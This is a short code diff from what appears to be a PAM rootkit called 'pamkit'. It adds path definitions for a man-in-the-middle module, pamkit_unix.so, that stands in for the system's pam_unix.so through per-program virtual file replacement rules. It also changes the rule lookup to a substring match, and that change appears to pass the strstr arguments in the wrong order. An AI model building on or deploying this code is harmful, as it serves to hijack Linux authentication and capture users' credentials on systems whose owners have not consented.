@@ -9,7 +9,9 @@
 #define PAMKIT_RESOURCE_DIR "<<SPECIFY>>"
 
 #define TARGET_PAM_MODULE_NAME "pam_unix.so"
-#define TARGET_MODULE_COPY_PATH PAMKIT_RESOURCE_DIR "/" TARGET_PAM_MODULE_NAME
+#define TARGET_MOD_COPY_PATH PAMKIT_RESOURCE_DIR "/" TARGET_PAM_MODULE_NAME
+#define MITM_PAM_MODULE_NAME "pamkit_unix.so"
+#define MITM_PAM_MODULE_PATH PAMKIT_RESOURCE_DIR "/" MITM_PAM_MODULE_NAME
 
 /**
  * Virtual file replacement rules
@@ -54,7 +56,8 @@ static inline vf_replacement_rule_t *
 get_vf_replacement_rule(const char *prog_name, const char *filepath)
 {
     for (size_t i = 0; i < NR_OF_VFILE_REPLACEMENT_RULES; i++) {
-        if (strcmp(vf_replacement_rules[i].file_to_be_replaced, filepath) == 0) {
+        /* Note: For now we say as rule-of-thumb that it suffices for the filepath to be a substring */
+        if (strstr(vf_replacement_rules[i].file_to_be_replaced, filepath)) {
             if (strcmp(vf_replacement_rules[i].program_name, prog_name) == 0) {
                 return &vf_replacement_rules[i];
             }
